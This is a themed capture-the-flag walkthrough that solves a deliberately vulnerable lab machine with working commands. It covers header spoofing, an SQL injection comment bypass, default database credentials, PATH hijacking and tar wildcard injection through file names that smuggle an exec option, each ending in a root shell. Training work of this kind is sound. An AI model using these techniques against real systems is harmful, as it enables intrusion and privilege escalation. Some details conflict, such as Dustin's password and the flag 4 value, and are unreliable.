# Into the Upside Down - CTF Walkthrough

A comprehensive step-by-step guide to finding all flags and keys in the Into the Upside Down CTF machine.

**Your Role**: You are **Alex Chen**, a cybersecurity researcher and former Hawkins National Laboratory intern investigating digital anomalies from the Upside Down. Your mission is to collect all keys and flags to close the digital gate before Vecna's influence spreads.

## 🎯 Overview

This CTF machine contains:
- **10 Flags** (CTCFlag{...}) hidden across different services and user accounts (Keeping CTCFlag format for backward compatibility with checking scripts)
- **10 Keys** (KEY1-KEY10) scattered throughout the infrastructure
- **Multiple Attack Vectors**: Web application (SQLi Filter Bypass), SSH machines (Path Hijacking, Wildcards), FTP server (Encrypted Zip), and database
- **Story-Driven Progression**: Navigate through levels of the Upside Down's digital manifestation, from Foundation Level to Foundation King

## 🚀 Initial Reconnaissance

### Step 1: Service Discovery
```bash
# Scan the target machine
nmap -sV -sC -p- <target_ip>

# Expected services:
# Port 80: HTTP (Web Application)
# Port 21: FTP (Vsftpd)
# Port 22: SSH (multiple instances on 2222, 2223, 2224)
# Port 3306: MySQL
```

## 🌐 Web Application Challenges

### Chapter 2: Breaking Into the Inner Circle (Foundation Level)

**Story Context**: *"Friends don't lie, but hackers do."* You need to access the Hawkins Lab Inner Circle—the admin panel containing classified information. The system is checking for both a specific User-Agent and an internal IP address.

**Objective**: Access the admin panel (Hawkins Lab Inner Circle) and establish your foundation in the digital dimension.

**Steps**:
1. Navigate to `http://<target_ip>/admin/`
2. You'll encounter a 403 Forbidden page with the message:
   > "UNAUTHORIZED PERSONNEL DETECTED. This area is under Hawkins National Laboratory surveillance. Turn back before the Demogorgons find you."
3. **Moderate Difficulty**: The page checks for a specific `User-Agent` and an internal `X-Forwarded-For` IP.
   ```bash
   curl -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
        -H "X-Forwarded-For: 127.0.0.1" \
        http://<target_ip>/admin/
   ```
4. Upon successful access, you'll see:
   - Message: "Only those with the highest clearance—or the most powerful psionic abilities—can see this page."
   - **Flag**: `CTCFlag{foundation_level_base}` (Foundation Level)
   - **KEY1 Location**: `/admin/key1.txt`

### Chapter 3: The Login Bypass (Secondary Level)

**Story Context**: *"The truth is hidden in plain sight."* The Hawkins Lab login system has security filters, but they're not perfect. You need to bypass authentication to reach the secondary level.

**Objective**: Bypass authentication to Hawkins Lab and reach the secondary level of access.

**Steps**:
1. Navigate to `http://<target_ip>/login/`
2. **Moderate Difficulty**: The login filters spaces, dashes, and hash symbols (`\s`, `-`, `#`).
3. Standard payload `' OR 1=1 --` will FAIL with error: "Security Alert: Malicious input detected. Access Denied."
4. Use a comment bypass payload to evade the filter:
   ```sql
   admin'/**/OR/**/'1'='1
   ```
5. Upon successful login, you'll see:
   - Message: "You have bypassed the perimeter security. You are now deep within the restricted zone."
   - **Flag**: `CTCFlag{secondary_level_access}` (Secondary Level)
   - **KEY2 Location**: `/login/key2.txt`

### Chapter 4: The Hidden Archives (Hidden Level)

**Story Context**: *"Dr. Brenner was known to hide sensitive information inside standard image files."* You've discovered references to Project MKUltra—the classified government program. The archives contain hidden secrets.

**Objective**: Access the credentials directory and extract hidden information using steganography.

**Steps**:
1. Navigate to `http://<target_ip>/credentials/`
2. You'll see the Project MKUltra archives page with the message:
   > "You have reached the archival records. Most files have been redacted or destroyed. However, some images remain. Dr. Brenner was known to hide sensitive information inside standard image files. Use your tools to extract the truth from the static."
3. Download `secret_image.png` from the page.
4. Use steganography tools to extract hidden data:
   ```bash
   # Using steghide (if password-protected)
   steghide extract -sf secret_image.png
   
   # Or using binwalk
   binwalk -e secret_image.png
   ```
5. Extract the hidden message which contains:
   - Reference to Project MKUltra
   - Cryptic hex data that may reveal access credentials
   - **Flag**: `CTCFlag{hidden_level_archive}` (Hidden Level)
6. **KEY3 Location**: `/credentials/key3.txt`

### Chapter 5: The Robots' Secret

**Story Context**: *"Sometimes the smallest clues lead to the biggest discoveries."* Standard web reconnaissance reveals a key hidden in plain sight. The full reward for this discovery awaits in VM3.

**Objective**: Discover KEY4 hidden in the robots.txt file.

**Steps**:
1. Check `http://<target_ip>/robots.txt`
2. The file contains:
   ```
   Disallow: /ftp KEY4: <generated_key>
   ```
3. Extract **KEY4** from the file (keys are dynamically generated)
4. This key was left by system administrators as a backup access method
5. **Note**: The corresponding **Flag 4** (`CTCFlag{robots_directive_discovery}`) is hidden in VM3 at `/home/max/flag4.txt` - you'll find it when you reach Chapter 10

## 📁 FTP Server Challenges

### Chapter 6: The FTP Portal (Gate Level)

**Story Context**: *"The gate is locked, but the key is in the message."* The FTP server is a digital portal between dimensions—a gateway that needs to be closed.

**Objective**: Access FTP, decrypt the secret file, and discover the gate access portal flag.

**Steps**:
1. Connect to FTP using anonymous access:
   ```bash
   ftp <target_ip>
   # Login: anonymous
   # Password: (press Enter)
   ```
2. **Important**: Read the banner message:
   ```
   Welcome to the Upside Down FTP. The gate is locked. Password Hint: gate_access
   ```
3. List files and download `secret.zip`:
   ```bash
   ls
   get secret.zip
   ```
4. Extract the zip file using the password from the banner hint:
   ```bash
   unzip -P gate_access secret.zip
   ```
5. Inside the extracted file, you'll find:
   - **Flag**: `CTCFlag{gate_access_portal}` (Gate Level)
   - This confirms the FTP server is a portal between dimensions

## 🗄️ Database Challenges

### Chapter 7: The Database of The Party

**Story Context**: *"The Party's credentials are scattered across the digital void."* The Party members' digital footprints are stored in the database. You'll need their credentials to access the SSH machines.

**Objective**: Extract credentials for SSH users from the MySQL database.

**Steps**:
1. Connect to MySQL using default credentials:
   ```bash
   mysql -h <target_ip> -u root -p
   # Password: example
   ```
2. Enumerate the database:
   ```sql
   SHOW DATABASES;
   USE ctf;
   SHOW TABLES;
   SELECT * FROM users;
   ```
3. Extract The Party members' credentials:
   - **Eleven**: `Waffles@011`
   - **Hopper**: `CoffeeAndContemplation`
   - **Mike**: `DungeonMaster83`
   - **Dustin**: `CompassGenius`
   - **Lucas**: `WristRocketMaster`
   - **Nancy**: `NancyWheeler1983`
   - **Jonathan**: `Photographer1983`
   - **Steve**: `HairSpray&Bat!1984`
   - **Max**: `KateBush&Headphones!1986`
   - **Will**: `WizardWill#CastleByers`
4. Additional credentials (not in database but needed):
   - **Joyce**: `Magnets&Lights!1983` (VM1)
   - **Vecna**: `ClockChimes&Spiders#001` (VM3)

## 🔐 SSH Machine Challenges

### Chapter 8: VM1 - The Communication Level (Port 2223)

**Story Context**: *"Will's voice echoes through the digital void."* Will was the first taken by the Upside Down, and his connection to the dimension runs deep. Joyce, his mother, never gave up searching for him.

**Objective**: Access VM1, perform forensics analysis, and discover the Communication Level and Foundation Protector flags.

**Steps**:
1. SSH into VM1:
   ```bash
   ssh -p 2223 will@<target_ip>
   # Password: WizardWill#CastleByers
   
   # Or as Joyce:
   ssh -p 2223 joyce@<target_ip>
   # Password: Magnets&Lights!1983
   ```
2. Read the welcome message:
   ```bash
   cat ~/welcome.txt
   ```
3. **Forensics Challenge**: Analyze `usbimage` in Will's home directory:
   ```bash
   cd ~/home/will
   file usbimage
   # Use appropriate forensics tools based on file type
   ```
4. Discover keys and flags:
   - **KEY5**: `/home/will/key5.txt`
   - **KEY8**: `/home/joyce/key8.txt`
   - **Will's Flag**: `/home/will/flag.txt`
     - Message: "Greetings, Noble Explorer... You have unlocked the power of communication across the void..."
     - **Flag**: `CTCFlag{communication_level_voice}` (Communication Level)
   - **Joyce's Flag**: `/home/joyce/flag.txt`
     - Message: "As you navigate through the corrupted dimensions... Joyce Byers, the fierce mother..."
     - **Flag**: `CTCFlag{joyce_foundation_protector_Q1RDRmxhZ3tlbGl4}` (Foundation Protector)

### Chapter 9: VM2 - The Perception Level (Port 2222)

**Story Context**: *"Dustin's insight pierces through the illusions."* Dustin's ability to see what others cannot makes him crucial. Steve evolved from a self-centered jock to a protector of The Party.

**Objective**: Access VM2, perform path hijacking privilege escalation, and discover the Perception Level and Foundation Enlightener flags.

**Steps**:
1. SSH into VM2:
   ```bash
   ssh -p 2222 dustin@<target_ip>
   # Password: PearlWhite#Grrr123
   
   # Or as Steve:
   ssh -p 2222 steve@<target_ip>
   # Password: HairSpray&Bat!1984
   ```
2. Read the welcome message:
   ```bash
   cat ~/welcome.txt
   ```
3. **Privilege Escalation (Moderate)**: Check sudo rights:
   ```bash
   sudo -l
   # Output: User can run /usr/local/bin/backup_script.sh without password
   ```
4. Examine the backup script:
   ```bash
   cat /usr/local/bin/backup_script.sh
   # Notice: The script calls 'date' using a relative path
   ```
5. **Exploit - Path Hijacking**:
   ```bash
   # Step 1: Navigate to /tmp
   cd /tmp
   
   # Step 2: Create a malicious 'date' script that spawns a bash shell
   cat > date << 'EOF'
   #!/bin/bash
   /bin/bash
   EOF
   
   # Step 3: Make it executable
   chmod +x date
   
   # Step 4: Modify PATH to prioritize /tmp
   export PATH=/tmp:$PATH
   
   # Step 5: Run the backup script with sudo (PATH is preserved for dustin)
   sudo /usr/local/bin/backup_script.sh
   
   # You are now root!
   ```
   
   **Verify root access:**
   ```bash
   whoami
   # Output: root
   
   id
   # Output: uid=0(root) gid=0(root) groups=0(root)
   ```
   
   **Access Steve's files as root:**
   ```bash
   cat /home/steve/key9.txt
   cat /home/steve/flag.txt
   ```
6. Discover keys and flags:
   - **KEY6**: `/home/dustin/key6.txt`
   - **KEY9**: `/home/steve/key9.txt`
   - **Dustin's Flag**: `/home/dustin/flag.txt`
     - Message: "Greetings, Valiant Explorer... You have pierced the veil between dimensions..."
     - **Flag**: `CTCFlag{perception_level_sight}` (Perception Level)
   - **Steve's Flag**: `/home/steve/flag.txt`
     - Message: "Your journey... has led you to Steve Harrington... a beacon of light in the darkness."
     - **Flag**: `CTCFlag{steve_foundation_enlightener_aXJfb2ZfaW1tb3J0}` (Foundation Enlightener)

### Chapter 10: VM3 - The Summit and The King (Port 2224)

**Story Context**: *"Max reached the summit, but Vecna rules from the shadows."* Max faced Vecna directly using Kate Bush's "Running Up That Hill" to break free. Vecna is the Mind Flayer's primary agent, the entity that rules the corrupted dimension.

**Objective**: Access VM3, perform tar wildcard injection privilege escalation, and discover the Summit Level and Foundation King flags (the final keys).

**Steps**:
1. SSH into VM3:
   ```bash
   ssh -p 2224 max@<target_ip>
   # Password: KateBush&Headphones!1986
   
   # Or as Vecna (after privilege escalation):
   ssh -p 2224 vecna@<target_ip>
   # Password: ClockChimes&Spiders#001
   ```
2. Read the welcome message:
   ```bash
   cat ~/welcome.txt
   ```
3. **Privilege Escalation (Moderate)**: Check for cron jobs:
   ```bash
   cat /etc/crontab
   # Output: Root runs tar -cf /tmp/backup.tar * in /home/max/uploads every minute
   ```
4. **Exploit - Tar Wildcard Injection**:
   ```bash
   # Step 1: Verify cron is running
   ps aux | grep cron
   # Should show: root ... cron
   
   # Step 2: Navigate to the uploads directory
   cd /home/max/uploads
   
   # Step 3: Create a malicious shell script
   cat > shell.sh << 'EOF'
   #!/bin/bash
   cp /bin/bash /tmp/bash
   chmod +s /tmp/bash
   EOF
   
   # Step 4: Make it executable
   chmod +x shell.sh
   
   # Step 5: Create checkpoint files (tar interprets these as arguments)
   touch -- "--checkpoint=1"
   touch -- "--checkpoint-action=exec=sh shell.sh"
   
   # Step 6: Verify files were created
   ls -la
   # Should show: --checkpoint=1, --checkpoint-action=exec=sh shell.sh, shell.sh
   
   # Step 7: Wait for cron to run (up to 60 seconds)
   # You can check if /tmp/bash exists
   sleep 60
   ls -la /tmp/bash
   
   # Step 8: Execute bash with SUID privileges
   /tmp/bash -p
   
   # You are now root!
   ```
   
   **Verify root access:**
   ```bash
   whoami
   # Output: root
   
   id
   # Output: uid=1002(max) gid=1002(max) euid=0(root) groups=1002(max)
   ```
   
   **Access Vecna's files as root:**
   ```bash
   cat /home/vecna/key10.txt
   cat /home/vecna/flag.txt
   cat /home/vecna/final.txt
   ```
5. Discover keys and flags:
   - **KEY7**: `/home/max/key7.txt`
   - **KEY10**: `/home/vecna/key10.txt` (Final key!)
   - **Flag 4**: `/home/max/flag4.txt`
     - Message: "Your keen eye has uncovered what others have overlooked..."
     - **Flag**: `CTCFlag{robots_exposed_backup}` (Robots Discovery - from Chapter 5)
   - **Max's Flag (7th)**: `/home/max/flag.txt`
     - Message: "Greetings, Brave Explorer... You have reached the summit level..."
     - **Flag**: `CTCFlag{summit_level_peak}` (Summit Level)
   - **Vecna's Flag**: `/home/vecna/flag.txt`
     - Message: "After navigating through layers... you finally encounter Vecna..."
     - **Flag**: `CTCFlag{vecna_foundation_king_YWxpdHlfYW1yaXR9}` (Foundation King)
   - **Final Message**: `/home/vecna/final.txt`
     - Contains the epilogue and completion message

---

## 🎉 Epilogue: Closing the Gate

**Story Context**: You've collected all 10 Keys and discovered all 10 Flags. The digital gate to the Upside Down can now be closed.

**Levels Completed**:
- ✅ **Foundation Level**: Admin panel access
- ✅ **Secondary Level**: Login bypass
- ✅ **Hidden Level**: Archive steganography
- ✅ **Gate Level**: FTP portal
- ✅ **Communication Level**: Will's voice across dimensions
- ✅ **Perception Level**: Dustin's third eye
- ✅ **Summit Level**: Max's peak understanding
- ✅ **Foundation Protector**: Joyce's unwavering resolve
- ✅ **Foundation Enlightener**: Steve's strategic wisdom
- ✅ **Foundation King**: Vecna's ultimate power

**Status**: Mission Complete. The digital gate is closed. But remember: **Vecna is always watching. The Upside Down never truly goes away. It just waits for another gate to open.**

---

*"Friends don't lie, but hackers do. And sometimes, that's exactly what you need to save the world."*

**Happy Hunting in the Upside Down!** 🩸
